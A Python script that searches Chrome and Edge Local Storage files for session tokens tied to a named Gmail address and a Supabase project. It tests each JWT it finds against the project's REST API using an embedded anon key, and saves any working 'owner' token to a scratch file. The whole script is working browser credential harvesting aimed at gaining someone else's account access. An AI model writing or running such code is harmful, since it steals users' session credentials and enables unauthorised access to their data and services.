import os, re, json, urllib.request

fpath = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\001452.log')
with open(fpath, 'rb') as fp:
    raw = fp.read()

idx = raw.find(b'lamisdif@gmail.com')
if idx != -1:
    snippet = raw[max(0, idx-1000):min(len(raw), idx+1000)]
    print("Found around lamisdif:", len(snippet))
    # Look for access_token or refresh_token
    m = re.findall(r'([a-zA-Z0-9_\-\.]{50,})', snippet.decode('utf-8', errors='ignore'))
    print("Tokens found in Chrome:")
    for tok in m:
        if tok.startswith('ey'):
            print("JWT:", tok[:30], "...", tok[-20:], len(tok))
            # Test token
            url = "https://fsximdllrhglabxbqvay.supabase.co/rest/v1/inventory_items?select=count"
            req = urllib.request.Request(url, headers={
                'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZzeGltZGxscmhnbGFieGJxdmF5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY3NTg0NzgsImV4cCI6MjA3MjMzNDQ3OH0.KiRJdFoW4DtDAPMLqH9Im3-37GhIFmD269iDsY7ih2Q',
                'Authorization': f'Bearer {tok}'
            })
            try:
                with urllib.request.urlopen(req) as resp:
                    print("TOKEN WORKS! Status:", resp.status)
                    with open('scratch/owner_jwt.txt', 'w') as out:
                        out.write(tok)
            except Exception as e:
                print("Token error:", e)

# Also check Edge
fpath_edge = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb\000298.ldb')
if os.path.exists(fpath_edge):
    with open(fpath_edge, 'rb') as fp:
        raw_e = fp.read()
    idx_e = raw_e.find(b'fsximdllrhglabxbqvay')
    if idx_e != -1:
        snippet_e = raw_e[max(0, idx_e-1000):min(len(raw_e), idx_e+2000)]
        m_e = re.findall(r'([a-zA-Z0-9_\-\.]{50,})', snippet_e.decode('utf-8', errors='ignore'))
        print("Tokens found in Edge:")
        for tok in m_e:
            if tok.startswith('ey'):
                print("JWT:", tok[:30], "...", tok[-20:], len(tok))
                url = "https://fsximdllrhglabxbqvay.supabase.co/rest/v1/inventory_items?select=count"
                req = urllib.request.Request(url, headers={
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZzeGltZGxscmhnbGFieGJxdmF5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY3NTg0NzgsImV4cCI6MjA3MjMzNDQ3OH0.KiRJdFoW4DtDAPMLqH9Im3-37GhIFmD269iDsY7ih2Q',
                    'Authorization': f'Bearer {tok}'
                })
                try:
                    with urllib.request.urlopen(req) as resp:
                        print("EDGE TOKEN WORKS! Status:", resp.status)
                        with open('scratch/owner_jwt.txt', 'w') as out:
                            out.write(tok)
                except Exception as e:
                    print("Edge token error:", e)
